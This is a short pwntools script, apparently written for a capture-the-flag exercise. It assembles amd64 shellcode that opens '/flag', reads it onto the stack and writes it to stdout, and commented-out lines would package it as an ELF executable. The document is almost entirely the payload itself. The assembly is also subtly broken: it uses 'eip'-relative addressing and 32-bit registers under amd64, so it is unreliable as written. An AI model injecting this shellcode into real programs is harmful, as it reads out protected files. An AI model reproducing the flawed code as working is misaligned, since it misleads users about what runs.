from pwn import *


context.arch = 'amd64'

sc = asm('''

	xor esi, esi             ; //Clear esi (used for system call arguments)
	xor edx, edx             ; //Clear edx (used for system call arguments)
	lea edi, [eip + path]
    xor eax, eax 
    mov al, 2                    ; //Syscall number for open()
    syscall 

    mov edi, eax                 ; //Store the file descriptor in rdi
    xor eax, eax                 ; //Syscall number for read()
    push rsp
  	pop rsi		                 ; //Buffer to read into (rsp)
    mov dl, 128                  ; //Number of bytes to read
    syscall 

    mov edx, eax                 ; //Number of bytes read is returned in rax, use it for write()
    mov al, 1                    ; //Syscall number for write()
    mov dil, 1                   ; //File descriptor for stdout (1)
    syscall 

    mov al, 60                   ; //Syscall number for exit()
    xor edi, edi                 ; //Exit code 0
    syscall 

    path:
    .string "/flag"

	''')

# payload = sc + b'\x00'

print(disasm(sc))

# elf = ELF.from_bytes(sc)

# elf.write(elf.entrypoint, sc)

# # Save as an ELF binary
# elf.save('shellcode_executable')
